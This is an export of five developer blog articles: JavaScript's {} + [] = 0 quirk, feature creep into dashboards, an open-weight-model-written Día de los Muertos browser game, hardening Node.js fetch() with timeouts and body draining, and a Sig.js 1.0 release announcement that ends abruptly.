articles.title: Yes, {} + [] = 0. No, JavaScript Isn’t Broken
articles.description: JavaScript is a legendary programming language. Created in the mid-1990s in just 10 days, it was born...
articles.body_html:
JavaScript is a legendary programming language. Created in the mid-1990s in just 10 days, it was born during the browser wars, when Netscape was trying to deliver a fatal blow to Microsoft. As we all know, that didn't exactly work out as planned… Today, some people love JavaScript, others hate it, and some just make fun of it. But the truth is, the modern web simply wouldn't exist without it!

Over the years, JavaScript has gone through countless revolutions. Its capabilities today are almost incomparable to what the language could do back in the 1990s. There's just one tiny problem… Every change to the language has to take into account the fact that millions of websites out there still rely on old JavaScript behavior. And some of those websites will probably continue running that code until the end of time.

So, well, JavaScript's weirdness is probably here to stay forever! 😂

After quite a long break, I've decided to bring back my once-popular JS WTF series. For a very simple reason. I'm on my way back from iJS Munich, and I still have two hours to kill at Frankfurt Airport… (don't ask). Not enough time to write a groundbreaking, deeply technical article. But definitely too much time to just sit here and stare at the wall.

So let's take a look at one of my favorite JavaScript constructions:

{} + [] // 0

Yes, you read that correctly. Under the right circumstances, if we add an empty object to an empty array in JavaScript, we get zero. And it makes perfect sense! 🤡

Wait, what? Why does this happen?

The first thing you need to know is that JavaScript doesn't necessarily interpret {} as an object in this situation! Depending on the context, the JavaScript parser can treat the expression as two completely separate things.

Consider this code at the beginning of a statement in a classic JavaScript script:

{} + []

JavaScript can interpret it like this:

{}    // An empty block of code
+[]   // Unary plus applied to an empty array (what could go wrong?)

That's right. The first {} isn't an object literal at all. It's simply an empty block of code that does absolutely nothing. And the second part? Well, that's where the fun begins.

The magic of type coercion ✨

The expression:

+[]

is a classic example of type coercion, one of the things our wonderful language is famous for.

As you probably know, JavaScript is a dynamically and weakly typed language.

Dynamic typing means that variables aren't permanently tied to one type. You can assign a number to a variable and then replace it with a string, and JavaScript won't complain.

But there's more! JavaScript also performs implicit type conversions, which is one of the reasons it's often described as weakly typed. And sometimes those conversions produce rather… creative results.

Take our unary plus operator:

+[]

Unlike the binary + operator, which can add numbers or concatenate strings, unary plus tries to convert its operand into a numeric value. In this case, it behaves essentially like:

Number([])

Yes, we're trying to convert an array into a number. Because why wouldn't we?

But before JavaScript can complete this operation, it needs to perform another conversion. An array is an object, and JavaScript first needs to obtain a primitive value from it. For an ordinary empty array, that process ends up calling its toString() method.

And guess what?

[].toString(); // ""

An empty array becomes an empty string.

So our conversion effectively looks like this:

Number([]);

// First, the array becomes a primitive string:
Number("");

// Then, the empty string becomes:
0

Because:

Number("") // 0

And therefore:

+[] // 0

Which means our original construction:

{} + []

when parsed as an empty block followed by unary plus, effectively becomes:

{} // Do absolutely nothing

+[] // 0

And that's how we get zero! Simple and obvious, right? 🤡

To be fair, I can't think of another language where exactly this construction would produce such a perfectly normal-looking result. Even our beloved PHP would, I believe, throw a fatal error for something like this. Although PHP has its own collection of fascinating surprises, so perhaps we shouldn't judge too harshly.

One important detail: this behavior depends on how the code is parsed. For example:

// In a classic script, as a standalone statement:
{} + [] // 0

// Force JavaScript to interpret {} as an object:
({} + []) // "[object Object]"

// Inside a function call:
console.log({} + []); // "[object Object]"

Okay, but what about [] + []?

Now that you understand type coercion, this one should be obvious:

[] + [] // ""

Here we're dealing with the binary + operator. JavaScript converts both arrays into primitive values. Well, what else would you expect when adding two empty strings together? 😀 Nothing plus nothing equals nothing! Beautiful.

And now, apparently, addition isn't even commutative 😂

Following the same logic, let's try another expression:

[] + {} // "[object Object]"

Wait a minute.

Didn't we just establish that:

{} + [] // 0

So why does reversing the operands give us something completely different? Apparently, even the commutative property of addition is optional in JavaScript. xD

Well, technically, we're not always performing mathematical addition here, and the parser treats these expressions differently.

But let's not ruin a good joke with technical details. Here's what actually happens. In this expression:

[] + {}

The empty array becomes an empty string:

[].toString() // ""

And the empty object? Well, a regular JavaScript object has its own wonderful string representation:

({}).toString() // "[object Object]"

So JavaScript effectively performs:

"" + "[object Object]"

Which gives us:

"[object Object]"

And that's it! Simple as building a flail. Okay, that's a literal translation of a Polish saying, proste jak budowa cepa, which means something is ridiculously easy to understand. And I think it fits JavaScript perfectly. 😂

Final thoughts

I hope you enjoyed this little journey into the wonderful world of JavaScript weirdness. And I hope that after reading this article, you'll appreciate the beauty and originality of this magnificent language even more.

After all, JavaScript has been keeping us entertained for over 30 years, and I strongly suspect it has plenty of surprises left.

And the best part? None of the examples above are bugs. They're all consequences of JavaScript's parsing rules, type coercion, and the language's long history of backward compatibility. So next time someone tells you JavaScript is broken because {} + [] can equal 0, you can proudly explain why it makes perfect sense.

Next time I'll tell you why {} + {} = NaN... but unfortunately time flies when you're having fun, and I'll have to get ready for my flight soon!

P.S. If you enjoy my content, feel free to connect with me or leave a like on LinkedIn! ❤️

articles.title: Every App Eventually Becomes a Dashboard. Please Make It Stop.
articles.description: Every good app starts with a lie.   “We’re going to keep this simple.”   I love that sentence.  So...
articles.body_html:
Every good app starts with a lie.

“We’re going to keep this simple.”

I love that sentence.

So optimistic.

So innocent.

So completely doomed.

At first, the app does one thing.

You open it.

You do the thing.

You leave.

Beautiful.

Then somebody adds analytics.

Then filters.

Then a sidebar.

Then “workspaces.”

Then team roles.

Then notifications.

Then an activity feed.

Then widgets.

And finally, inevitably:

The Dashboard.

Congratulations.

Your tiny useful app has completed its lifecycle and become enterprise software.

Nobody asks for the dashboard

That’s the funny part.

I have never opened an app and thought:

You know what this needs?

Four metric cards and a donut chart.

And yet dashboards are everywhere.

Project management app?

Dashboard.

Writing app?

Dashboard.

Bookmark manager?

Dashboard.

Tool for watering your houseplants?

Give it six months.

You’ll be comparing weekly moisture retention against the previous quarter.

Feature creep has excellent manners

Nobody says:

Let’s ruin the simplicity of this thing.

It happens politely.

“We should probably show recent activity.”

Sure.

“Users might want some stats.”

Makes sense.

“Could we add shortcuts?”

Why not.

“What about customizable widgets?”

Okay...

“Enterprise customers need roles and permissions.”

Fair.

“And maybe an AI assistant.”

Of course.

“And a marketplace.”

Wait.

How did we get here?

Six months ago this app converted PDFs.

Now I’m assigning workspace permissions so Brenda from Finance can access the Q3 conversion insights panel.

Feature creep never kicks the door down.

It asks if it can stay for the weekend.

Then it brings a toothbrush.

Then furniture.

Then suddenly it lives there and you’re paying its AWS bill.

We keep confusing “more” with “better”

This is where software gets weird.

If something can be added, we immediately start discussing how to add it.

Very rarely do we ask:

Should this exist at all?

A product with 40 features looks impressive on a pricing page.

It gives marketing more boxes to tick.

It gives sales more talking points.

It gives product teams something to ship.

And it gives users another settings page they will never open.

But capability is not the same thing as value.

Sometimes the best feature is the one that never got built.

Which is unfortunately hard to put in release notes.

Version 4.7

  • Added nothing.
  • Product still works.
  • You’re welcome.

I would genuinely respect that update.

Simple software now feels luxurious

This might be the strangest part.

When I find software that opens quickly, does one thing well, and doesn’t immediately ask me to:

  • create a workspace
  • invite my team
  • choose a template
  • configure notifications
  • watch a product tour
  • “explore what’s new”

…it feels premium.

Not premium as in expensive.

Premium as in:

someone showed restraint.

There’s confidence in a product that doesn’t desperately need you to discover twelve other things it can do.

It just works.

Then it gets out of the way.

That used to be normal.

Now it feels almost rebellious.

The dashboard is usually a symptom

I don’t actually hate dashboards.

Some products genuinely need them.

If I’m monitoring servers, revenue, logistics or infrastructure, please give me graphs.

Give me alarming red numbers.

Give me twelve panels if you have to.

I’m talking about the other kind.

The dashboard that exists because the product no longer knows what its main job is.

The one where I log in and get:

Good morning, Jacob!

Thanks.

What now?

There are seven cards.

Three charts.

A “Getting Started” panel despite me using the product for two years.

A button that says Explore.

Explore what?

I came here to rename a file.

I miss software with edges

I miss products that knew where they ended.

They had a job.

They did it.

They didn’t try to become:

  • your operating system
  • your community
  • your knowledge base
  • your collaboration hub
  • your analytics platform
  • your personal assistant
  • your second home

Not every app needs to become a platform.

Sometimes a timer can just be a timer.

Sometimes notes can just be notes.

Sometimes I would like to open software without being invited into an ecosystem.

I already live in one ecosystem.

It’s called the internet.

It’s exhausting enough.

Maybe “more” is the wrong direction

We’ve spent years asking:

What else can this product do?

Maybe the better question is:

What can we remove without making it worse?

That question is much harder.

Adding something feels productive.

Removing something feels dangerous.

But simplicity isn’t the absence of work.

Usually it’s the result of a lot of work nobody sees.

The best products often feel obvious.

And making something feel obvious is incredibly difficult.

So if you're building something right now, I have one small request.

Before adding analytics...

Before adding widgets...

Before adding customizable workspaces...

Before adding the card that tells me I’m “73% productive this week”...

Ask yourself:

Does this actually make the product better?

Or are we just slowly building another dashboard?

Because somewhere out there, a beautiful little app is currently doing exactly one thing really well.

And I guarantee somebody is already designing its sidebar.

What’s the worst case of dashboardification you’ve seen?

Or better:

What app do you love specifically because it still refuses to become one?

articles.title: 💀I'm the last mail carrier in the land of the dead. An open-weight model writes all the mail.
articles.description: This is a submission for the Hacktoberfest Open-Source AI Challenge: Week 4: Ghost in the...
articles.body_html:
This is a submission for the Hacktoberfest Open-Source AI Challenge: Week 4: Ghost in the Machine.

ÁNIMAS is a small 3D browser game set in Mictlán, the land of the dead, on Día de los Muertos. You play a skeleton mail carrier who helps lost ghosts cross over by delivering their letters and finding the things they miss.

Every ghost in the game (name, backstory, personality, dialogue, the item they miss) and every letter between ghosts is written by Gemma 4, an open-weight model, using structured JSON output. The game ships with 24 pre-generated ghosts so it plays instantly in any browser, and it can connect to a Gemma server to write new ones live while you play.

What I Built

Play ÁNIMAS in your browser

You play a little calaca, a skeleton in a striped serape with a crown of marigolds: the last mail carrier of Mictlán, the Aztec land of the dead, on the one night of the year when the souls go home. The ghosts wandering the town have unfinished business. Some want a letter carried to another ghost. Some miss one small thing (a guitar, a pocket watch, a cup of chocolate) that's waiting somewhere in the world. Deliver it, and they cross over.

The town is meant to be wandered:

  • Four barrios of pastel houses around a plaza with a great ofrenda. Every roof is walkable. You climb outside stairs, stacked crates and market awnings, then cross planks from rooftop to rooftop.
  • A chapel whose bell tower you climb flight by flight. A hillside of terraces that ends in a lookout and a long, high plank out to La Campana, a floating rock with a bell.
  • Rope bridges to the islands around town: a cemetery, a floating market, an orchard, a dock with stepping stones across the water to a tiny islet, and a staircase of floating stones up to El Mirador, the highest point in the world.
  • Three houses you can walk into: a grandmother's house with a stove and a little ofrenda, a watchmaker's workshop, the blue house. Each has a staircase up to a hatch in the roof, and something someone is missing waiting inside.
  • Golden calaveras hidden on rooftops, towers, awnings and the far ends of things. The game never tells you where they are.
  • A minimap that turns with your camera, a full map (M), and a mail bag that holds up to four deliveries at once, so you can plan a route.

And then there are the wings 🪽 Free three souls and they give you wings (Alas de papel): in the air, tap Space to beat them, hold it to glide. Six souls, and they fill with marigolds and carry you further. Ten, and you become el Ángel de Mictlán, with a halo and a trail of light, flying over the rooftops you used to climb. Some golden calaveras are only reachable by wing, including one on La Nube, a cloud island high above the town. You'll know what you're working towards: a few other (NPC) mail carriers make their rounds through the streets, and the ones who already earned their wings glide over the rooftops above you.

Demo

🔗 Live:

🎃 ÁNIMAS 👻

🪽 ÁNIMAS is a small 3D browser game set in Mictlán, on Día de los Muertos.

Live Demo 🔥 - https://animas-virid.vercel.app

The hosted version plays with the ghosts and letters Gemma wrote ahead of time; run the repo locally to have Gemma keep writing new ones.

🎮 Play it now:

A few other letters waiting in the mail tonight, all written by Gemma 4 E2B on a 2-core CPU with no GPU:

Dolores → Mateo · neighbors who shared sweet bread on the same street
"Do you remember how we tried to bake that disastrous sourdough last summer? It ended up looking like a melted swamp, but we laughed until our bellies hurt."
Mateo: "Oh, the swamp! I still chuckle thinking about that."

Nonna Pina → Ama · they shared stories of mythical creatures
"I remember the night we huddled under the old mango tree, and you told me the secret names of the forest spirits."

Benedita → Felipe · a love for forgotten folk songs
"Remember the night we thought the moon was actually a giant, silver cat?"
Felipe: "That tune… I haven't heard that melody in fifty years."

Controls: move the mouse to look (click the world once), WASD walks wherever you're looking · Shift run · Space jump (twice for a flip; with wings, again to flap, hold to glide) · E talk · 1/2/3 choose · M map · Tab next delivery · F dance. On a phone: a thumbstick on the left, drag the right side to look, buttons for jump, talk and dance.

When the game runs with its keeper server (npm start + Gemma), you can also summon someone you miss at the great ofrenda. Describe them in a sentence and Gemma turns them into a ghost who wanders the town tonight, for strangers to meet. It's the only place in the game where you type, and your words are never stored, only the ghost.

How I Built It

Code: github.com/longphanquangminh/animas (MIT).

longphanquangminh / animas

🪽 ÁNIMAS is a small 3D browser game set in Mictlán, on Día de los Muertos.

💀 ÁNIMAS

The last mail carrier in the land of the dead. Every ghost, and every letter they send each other, is written by an open-weight model.

A 3D exploration game for Día de los Muertos. You are a small calaca in a striped serape and a crown of marigolds, walking the town of Mictlán on the one night the souls go home. Ghosts wander its plaza, rooftops and outer islands. Some want a letter carried to another ghost; some miss one small thing waiting somewhere in the world. Deliver it, and they cross over, rising into a sky of lanterns that everyone online shares.

Every ghost and every letter is written by Gemma 4, running on your own machine or server, under JSON-Schema grammars.

Built for the DEV Hacktoberfest Open-Source AI Challenge, Week 4: Ghost in the Machine.

Play
W A S D walk (Shift to
…
View on GitHub

There's no game engine, no build step and no 3D model files. The client is Three.js with hand-written shaders. The server is plain Node with zero npm dependencies. Gemma 4 runs behind Ollama or llama.cpp.

Two grammars: one for people, one for mail

The keeper (that's what the server calls the model) doesn't get asked nicely for JSON. It gets a grammar. The server sends a JSON Schema, the runtime compiles it into a grammar, and at every decoding step any token that would break the schema gets a probability of zero.

Ghosts have a name, a hometown, a life, a personality, a greeting, a memory, the object they miss, an ask, a thank-you and an epitaph. The object is an enum of twelve things that physically exist on pedestals around the world, so every errand Gemma invents is solvable.

Letters are written later, between two ghosts that are both wandering right now. The server picks a sender and a recipient, hands Gemma both of their lives, and asks it to invent the connection:

const LETTER_SCHEMA = {
  type: "object",
  properties: {
    relation: { type: "string", maxLength: 70 },   // "neighbors who shared sweet bread on the same street"
    ask:      { type: "string", maxLength: 170 },  // the sender asks you to carry it
    letter:   { type: "string", pattern: "^Dear [^,]{1,30}, .{60,400}$" },
    reply:    { type: "string", maxLength: 200 },  // the recipient, out loud, after reading
  },
  required: ["relation", "ask", "letter", "reply"],
};

That pattern is there because of a lesson. In my first batch, about half the "letters" came back as descriptions of letters: "From Kofi to Sal, referencing shared memories (film/ramen)." The model understood the task and summarized it instead of doing it. A one-line example in the prompt, plus a grammar that forces the field to literally start with Dear <name>,, fixed it. Every letter since has been a real letter.

The same thing happened with objects. When Gemma could pick any of the twelve, 9 of 24 ghosts chose the marigold crown, and then asked in their dialogue for a spoon or a fountain pen. The structured field was perfect; the prose wandered off. Now the server rolls dice (name, place, decade, job, personality, soul color, and an object that follows from the job: a baker misses pan dulce, a clockmaker a pocket watch) and builds a grammar for that one ghost, with the object pinned as a single-value enum placed first, before any prose. The grammar guarantees the shape. The dice guarantee the meaning.

Gemma 4 and the empty thought channel

Gemma 4 can think before it answers, inside a special thought channel. On llama.cpp the grammar is relaxed inside that channel, so the model sometimes rambled there and never came back to the JSON. The fix: I render the chat template myself and append an empty thought channel (<|channel>thought\n<channel|>) before generation starts, so the grammar governs every token from the first one. (On Ollama, think: false does the same job.) That's only possible when you control the prompt down to its special tokens.

Writing ahead of the player

On the box where I built this, Gemma 4 E2B takes about a minute to write a ghost and 15 to 60 seconds to write a letter. Nobody waits for it. The server keeps a pool of ghosts written ahead of time, and a second loop keeps about half of the wandering ghosts holding a letter for another wandering ghost. When a letter's recipient crosses over before you arrive, there's a red mailbox by the Correo that sends it to the other side. The model works like a novelist in the back room, not a chatbot at the counter.

A town you can climb

The town is generated in code from a fixed seed, so every player gets the same streets. Collision is three small ideas:

  • pads: round islands whose cliffs are walls,
  • boxes: houses, crates, awnings, the tower (a walkable top and solid sides),
  • ramps: stairs, planks and rope bridges (walkable, no walls).

The character controller steps up anything under 0.8 m, jumps about 2 m (3.5 m with the double jump), and has coyote time. Fall into the river and it carries you back to the last shore you stood on. The camera pulls in when a house gets between it and you.

To make sure the town is fair, I wrote a reachability check: a breadth-first search over the whole map using the same rules as the character (step up 0.8 m, jump up to about 3 m, drop any distance). It runs in a headless browser and reports anything that can't be reached from the plaza. The first run found that the stepping stones to the islet and to El Mirador were a little too far apart. Now every calavera, every object and every ghost passes.

A skeleton made of code

There are no model files in the repo. The calaca is a few dozen primitives: a sugar-skull face painted onto a canvas texture, glowing pupils that blink, bone limbs on pivots, a serape whose stripes come from the player's hue, a crown of flowers. Walking, running, jumping, the mid-air flip, carrying an object overhead, gesturing while talking and dancing (F, try it) are procedural animation with squash and stretch. Ghosts are a lathe-turned sheet with a shader: a glow in their soul's color, a rippling hem, and a mouth that moves while their words type out in Animal-Crossing-style babble, at a pitch derived from their name.

Around them: thousands of instanced marigolds and candles, papel picado on sagging ropes, glowing windows, a mirror-water river, drifting marigold wisps, souls rising slowly while petals fall, monarch butterflies (said to be the returning souls), bloom and film grain. All the sound is procedural Web Audio.

Why open innovation matters here

I needed control below the API. Compiling my own schemas into grammars, pinning the object per ghost, forcing a letter to begin with "Dear", appending an empty thought channel token by token: none of that is available through a closed chat API, and the game design depends on all of it.

A town that writes its own mail needs an AI that costs electricity, not tokens. The server writes ghosts and letters in the background forever. With a per-token bill I'd ration them. With open weights on my own box, the mail never stops.

Some of these ghosts are real people. When someone summons a grandparent at the ofrenda, those words are grief. They don't belong in a third-party provider's logs. With an open model, the memory goes from the browser to a server I control, becomes a ghost, and the original words are thrown away.

A memorial shouldn't disappear when an API does. Open weights on disk and a dependency-free server will still run in 2036, and anyone can host a Mictlán for their own family.

Come pick up the mail

Play ÁNIMAS. Deliver a few letters, earn your wings, then tell me in the comments who wrote to whom and how many golden calaveras you found. (There's one on top of the bell tower, and one even higher. That's all I'm saying.)

They're not gone while someone still remembers. 🌼💀✉️

Prize categories: Best Use of Gemma. Gemma 4 writes every ghost and every letter in the game, under JSON-Schema grammars that keep every errand solvable and every letter a real letter.

Solo submission by @longphanquangminh.

articles.title: Stop Using Default Node.js fetch() in Production Without These Two Fixes
articles.description: Native Node.js fetch() looks clean, but its 300-second default timeout and unconsumed error streams can silently exhaust your production sockets and memory. Fix both with a hardened wrapper.
articles.body_html:
When native fetch() became stable in Node.js, engineering teams celebrated. We finally had a standard, zero-dependency HTTP client built directly into the runtime, powered by Node's fast undici engine. Thousands of teams ripped out axios and node-fetch and replaced them with clean, standard await fetch(url) calls.

Then the production incidents started.

If you copy-paste browser-style fetch() calls into a backend Node.js service, two misleading defaults will eventually take your service down under load: a 5-minute default timeout and lazy garbage collection on unconsumed response streams.

Let's look at why a 6-line fetch() function that passes every code review can silently starve your production server of sockets and memory—and the exact wrapper that fixes both.

The Code That Looks Completely Fine (Until Traffic Spikes)

Here is how 90% of developers write an outbound API call in Node.js today:

// ❌ Looks clean in code review, dangerous in production
export async function fetchUserProfile(userId: string) {
  const response = await fetch(`https://api.partner-service.com/v1/users/${userId}`, {
    headers: { Authorization: `Bearer ${process.env.API_TOKEN}` },
  });

  if (!response.ok) {
    throw new Error(`Partner API failed with status ${response.status}`);
  }

  return response.json();
}

In local development and staging, this code works flawlessly. In production, when api.partner-service.com experiences a brownout or starts returning 502 Bad Gateway html pages at 200 requests per second, this function triggers a cascading outage in your Node.js process.

Here is why.

Trap #1: The 300-Second (5-Minute) Default Timeout

How long does await fetch(url) wait if the upstream server accepts the TCP connection or TLS handshake, and then simply hangs without sending response headers or finishes the body slowly?

In Node.js, native fetch() follows the Chromium/Undici default: 300,000 milliseconds (5 minutes) for both headersTimeout and bodyTimeout.


The 5-Minute Trap: Without an explicit AbortSignal, a single degraded third-party API will hold your Node.js request handler, database transaction, or serverless execution open for up to 300 seconds before throwing a HeadersTimeoutError.

Think about the math on a backend service handling just 50 requests per second:

  • An upstream webhook or payment provider starts hanging.
  • None of your fetch() calls fail quickly; instead, 50 new promises pile up every single second.
  • Within 10 seconds, you have 500 concurrent in-flight requests holding memory closures, open file descriptors, and often database pool connections waiting for fetch() to settle.
  • Your container hits an Out-Of-Memory (OOM) kill or your upstream load balancer starts dropping health checks long before the 300-second default timeout ever fires.

Trap #2: Throwing on !response.ok Without Draining the Body

Look again at the error branch in our original snippet:

if (!response.ok) {
  // ❌ We throw immediately without reading or canceling response.body!
  throw new Error(`Partner API failed with status ${response.status}`);
}

When await fetch() resolves, Node.js has only parsed the HTTP status line and response headers. The underlying TCP socket is still streaming or buffering the response body (for example, an HTML error page from Cloudflare or a verbose JSON error payload from an upstream microservice) through a Web ReadableStream.

If you neither consume the body (await response.text() / await response.json()) nor explicitly cancel it (await response.body?.cancel()), what happens to the underlying HTTP/1.1 keep-alive socket in Undici's connection pool?

According to the official Undici documentation, the socket cannot be cleanly reused immediately. Instead, Undici must wait for V8's garbage collector to eventually run a finalizer on the unreferenced response object before tearing down or reclaiming the stream.

Why V8 Garbage Collection makes unconsumed bodies worse on large servers
V8's garbage collector is intentionally lazy when a Node.js container has plenty of free RAM. If your container has a 2 GB memory limit and your heap is only at 300 MB, V8 feels no pressure to run a major GC cycle.

Meanwhile, if an upstream service starts returning 500 Internal Server Error or 429 Too Many Requests at high volume and your code throws without consuming or canceling response.body:

  1. Hundreds of unread ReadableStream buffers sit in memory waiting for GC.
  2. Underlying sockets stay occupied or get destroyed instead of returning cleanly to the keep-alive pool.
  3. Your service experiences sudden RSS memory climbs and socket exhaustion (UND_ERR_CONNECT_TIMEOUT) just when you need resilience most.

The Fix: Always Enforce a Deadline and Always Drain or Cancel the Stream

You don't need to reinstall axios to fix this. Native Node.js provides everything you need via AbortSignal.timeout() and explicit stream disposal.

1. Use AbortSignal.timeout(ms) on Every Call

Added natively to Node.js and modern runtimes, AbortSignal.timeout(ms) automatically aborts the fetch() request and rejects with a TimeoutError (DOMException) if the entire request-response cycle (including reading the body!) exceeds your deadline.

2. Consume or Cancel response.body on Non-2xx Responses

Whenever response.ok is false, either read the error payload with await response.text() (which both drains the socket for immediate keep-alive reuse and gives you diagnostic context) or call await response.body?.cancel() if you don't care about the error body.

Here is a drop-in, production-hardened safeFetchJson wrapper you can use across any Node.js service:

// lib/http.ts
export interface SafeFetchOptions extends RequestInit {
  timeoutMs?: number;
}

export class HttpResponseError extends Error {
  constructor(
    public readonly status: number,
    public readonly url: string,
    public readonly bodyPreview: string
  ) {
    super(`HTTP ${status} from ${url}: ${bodyPreview}`);
    this.name = 'HttpResponseError';
  }
}

export async function safeFetchJson<T>(
  url: string,
  options: SafeFetchOptions = {}
): Promise<T> {
  const { timeoutMs = 5000, signal: callerSignal, ...fetchOptions } = options;

  // 1. Combine a strict timeout deadline with any caller-provided AbortSignal
  const timeoutSignal = AbortSignal.timeout(timeoutMs);
  const signal = callerSignal
    ? AbortSignal.any([callerSignal, timeoutSignal])
    : timeoutSignal;

  const response = await fetch(url, {
    ...fetchOptions,
    signal,
  });

  // 2. Always drain or cancel the body stream on error statuses
  if (!response.ok) {
    let errorPreview = '';
    try {
      const rawText = await response.text();
      errorPreview = rawText.slice(0, 256); // Keep logs bounded
    } catch {
      await response.body?.cancel().catch(() => {});
    }
    throw new HttpResponseError(response.status, url, errorPreview);
  }

  // 3. Consuming .json() drains the stream and releases the keep-alive socket
  return (await response.json()) as T;
}

Bonus: What If You Only Need Headers (HEAD or Status Check)?

If you intentionally call fetch(url) only to inspect response.status or response.headers.get('content-length') and never plan to read the body, always cancel the body immediately in a finally block:

export async function checkEndpointReachable(url: string): Promise<boolean> {
  const response = await fetch(url, {
    method: 'GET',
    signal: AbortSignal.timeout(3000),
  });

  try {
    return response.ok;
  } finally {
    // ✅ Immediately release the underlying Undici socket without waiting for V8 GC
    await response.body?.cancel().catch(() => {});
  }
}

Read the Official Node.js Undici Garbage Collection and Socket Reuse Guide

Production fetch() Resilience Checklist

Before deploying native fetch() to production in Node.js, verify these five items:

  • [ ] Every outbound fetch() call includes signal: AbortSignal.timeout(ms) (typically 2000–8000 ms for synchronous user-facing requests).
  • [ ] Combine caller cancellation signals with timeouts using AbortSignal.any([callerSignal, AbortSignal.timeout(ms)]).
  • [ ] Every !response.ok branch either reads await response.text() or calls await response.body?.cancel() before throwing.
  • [ ] Any fire-and-forget request that only inspects status codes or headers cancels response.body in a finally block.
  • [ ] Distinguish between err.name === 'TimeoutError' (deadline exceeded) and err.name === 'AbortError' (caller canceled) in your error monitoring logs.

The Takeaway

Native fetch() in Node.js was designed for spec compliance with browsers—not for defensive backend resilience out of the box. In a browser tab, waiting 300 seconds or letting garbage collection clean up an abandoned stream rarely hurts anyone. In a high-throughput Node.js server, those same defaults turn minor upstream hiccups into full service outages.

Wrap your fetch() calls once: enforce an AbortSignal.timeout() on every request, and never leave a response stream unconsumed when throwing an error.

Have you migrated your Node.js services to native fetch(), or do you still prefer a wrapper library like ky or got for built-in timeouts and retries?

Sources & Further Reading

  • Node.js / Undici Documentation: Garbage Collection & Unconsumed Response Bodies
  • MDN Web Docs: AbortSignal.timeout() Static Method
  • MDN Web Docs: AbortSignal.any() Static Method
  • Node.js Official Documentation: Global fetch() API

articles.title: Sig.js Has Reached Version 1.0
articles.description: Well, we did it.  Sig.js is officially at version 1.0 and available on npm.  And I have to admit,...
articles.body_html:
Well, we did it.

Sig.js is officially at version 1.0 and available on npm.

And I have to admit, this one feels pretty good.

I've spent a lot of time writing about KiwiEngine, its architecture, its individual libraries, and the philosophy behind building a system from smaller, focused components.

I've talked about why I want to build an engine instead of another collection of loosely connected utilities.

I've talked about intentional programming, abstractions, responsibility, and giving developers more control without making them rebuild everything.

But eventually, all that thinking has to turn into something.

Something that works.

Something that can be installed.

Something that other developers can actually use.

Today, Sig.js crossed that milestone.

From An Idea To A Published Library

For anyone who hasn't been following the series, Sig.js is the reactive UI library I've been developing as part of KiwiEngine.

It's built around signals and a lightweight JSX rendering model.

The goal is to make reactive interfaces understandable without requiring an enormous framework around them.

At its core, I wanted something that could answer a fairly straightforward question:

When application state changes, how does the interface respond?

That sounds simple.

And conceptually, it is.

But once you start building a reactive rendering system, the questions get considerably more interesting.

How are dependencies tracked?

How do effects respond to changes?

How do components manage their lifecycle?

What happens when something gets removed from the interface?

How should rendering and cleanup work together?

How do you prevent the abstraction from becoming more complicated than the problem?

Those are the kinds of questions that shaped Sig.

Sig Is More Than A Signals Utility

One of the important developments along the way was establishing Sig as more than a small reactive state library.

Signals are the foundation.

But the library also provides the machinery needed to build interfaces around them.

That includes:

  • Reactive signals and effects
  • Derived values through memoization
  • A JSX runtime
  • Component mounting and cleanup
  • Reactive DOM behavior
  • A lightweight router
  • Integration with Juice

These pieces give Sig a much clearer identity.

It's not trying to become an entire application framework.

It's becoming a focused reactive UI engine.

And that distinction matters.

The JSX Runtime Was A Big Step

I wanted KiwiEngine to have a way to describe interactive interfaces without requiring another framework to own the rendering model.

JSX gives me an expressive way to describe the interface.

Sig handles the reactive behavior underneath it.

That's a useful separation.

The syntax describes what should appear.

The reactive system determines how the interface responds to changing state.

The renderer handles the relationship with the DOM.

And lifecycle behavior makes sure the system can clean up after itself.

That last part is especially important.

It's relatively easy to make a counter update.

It's considerably harder to make an entire application behave predictably as components appear, disappear, and change.

That's where the real engineering starts.

The Relationship With Juice Is Becoming Real

Another part of this release that I'm excited about is the integration with Juice.

I've written quite a bit about Juice recently.

Juice is becoming the design and styling engine within KiwiEngine.

It translates design intent and configuration into styling behavior.

Sig handles reactivity.

Those are different responsibilities.

But interfaces need both.

A checkbox might have a visual state.

A disclosure might open or close.

A modal might become visible.

An interactive control might need to communicate its state back to the application.

The Sig and Juice integration creates a way for those systems to work together without turning them into one enormous library.

And importantly, that integration is optional.

Sig doesn't have to become Juice.

Juice doesn't have to become Sig.

They can remain independent systems that become more capable when composed.

That's exactly the architecture I've been trying to build.

Getting To Version 1 Wasn't About Adding Everything

This is probably the biggest lesson of the release.

There are still things Sig doesn't do.

There are still things I want to explore.

There are still experimental APIs.

And there are capabilities that I've deliberately decided don't belong in this first stable release.

For example, server-side rendering isn't part of Sig 1.0.

Neither is a virtual DOM.

I'm not trying to reproduce every abstraction available in other UI frameworks.

I'm trying to establish a focused model that makes sense for Sig.

Some capabilities may arrive later.

Some may never belong.

And that's okay.

A library doesn't become mature simply because it has more features.

Sometimes maturity means becoming more comfortable with its limitations.

Version 1 Is A Commitment

I've said this before in the series, but I think it's worth repeating.

Version 1.0 doesn't mean a library is finished.

It means something closer to:

I understand what this library is, and I'm ready to establish a dependable foundation around that understanding.

For Sig, that means the stable public API now carries a stronger compatibility commitment.

Changes need to be more deliberate.

Breaking existing behavior has consequences.

Documentation becomes more important.

Testing becomes more important.

The developer experience becomes more important.

It's no longer just a collection of experiments I can freely reshape whenever another idea comes along.

It's a library with a public contract.

And that's a different kind of responsibility.

The Release Was About Stabilizing, Not Reinventing

Something I particularly like about this milestone is that version 1.0 didn't require inventing a completely new API.

The release formalizes the API developed through the previous 0.7.x work.

That's how I want these libraries to mature.

Experiment.

Build.

Test.

Refine.

Use the library.

Discover where the abstraction is awkward.

Improve it.

Then, when the design becomes stable enough, establish that contract.

I don't want version numbers to become a marketing exercise.

I want them to mean something.

Testing Outside The Monorepo Matters

There's another important part of releasing a library that can be easy to overlook.

It's one thing for a package to work inside the repository where it was developed.

It's another thing for someone to install it from npm into an independent project.

That distinction matters.

A library shouldn't require mysterious workspace configuration or internal repository knowledge just to get started.

For this release, the standalone counter example was tested against the published npm package.

That included installation, TypeScript checking, and building the application.

It's a small example.

But it proves something important.

Sig isn't just a piece of the KiwiEngine repository.

It can exist as a published package that developers install and use.

That's a meaningful step toward the kind of modular ecosystem I want.

You Can Install Sig.js Now

Sig.js 1.0 is published under the CitrusWorx npm scope.

npm install @citrusworx/sigjs

The package includes its reactive core, JSX runtime, router, and optional Juice integration.

You don't need to adopt all of KiwiEngine just to explore Sig.

That's intentional.

I've always wanted the individual libraries to have their own identities and responsibilities.

They should be useful within the larger ecosystem.

But they shouldn't exist only because the larger ecosystem exists.

This Is A Milestone For KiwiEngine Too

This is the part that makes the release especially exciting to me.

